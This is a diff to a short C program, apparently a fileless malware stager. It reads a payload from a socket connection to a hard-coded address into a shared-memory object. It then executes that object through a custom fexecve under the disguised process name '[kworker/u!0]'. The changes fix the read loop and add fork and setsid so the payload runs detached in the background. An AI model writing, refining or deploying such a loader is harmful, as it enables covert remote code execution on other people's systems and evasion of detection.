@@ -28,8 +28,10 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 // shm_open
 #include <sys/stat.h>
+#include <sys/mman.h>
 #include <fcntl.h>
 
+#define BUF_SIZE 1024
 
 extern char        **environ;
 int
@@ -44,7 +46,7 @@ my_fexecve (int fd, char **arg, char **env)
 int
 main (int argc, char **argv)
 {
-  int                fd, s;
+  int                fd, s, n;
   unsigned long      addr = 0x0100007f11110002;
   char               *args[2]= {"[kworker/u!0]", NULL};
   char               buf[1024];
@@ -58,15 +60,23 @@ main (int argc, char **argv)
 
   while (1)
     {
-      if ((read (s, buf, 1024) ) <= 0) break;
-      write (fd, buf, 1024);
+      if ((n = read (s, buf, BUF_SIZE) ) <= 0) break;
+      write (fd, buf, n);
+      if (n < BUF_SIZE) break;
     }
   close (s);
   close (fd);
 
   if ((fd = shm_open("a", O_RDONLY, 0)) < 0) exit (1);
   //if (fexecve (fd, args, environ) < 0) exit (1);
-  if (my_fexecve (fd, args, environ) < 0) exit (1);
+  
+  pid_t cpid = fork();
+  if (cpid == 0)
+    {
+      setsid ();
+      if (my_fexecve (fd, args, environ) < 0) exit (1);
+    }
+  exit (0);
 
   return 0;
     
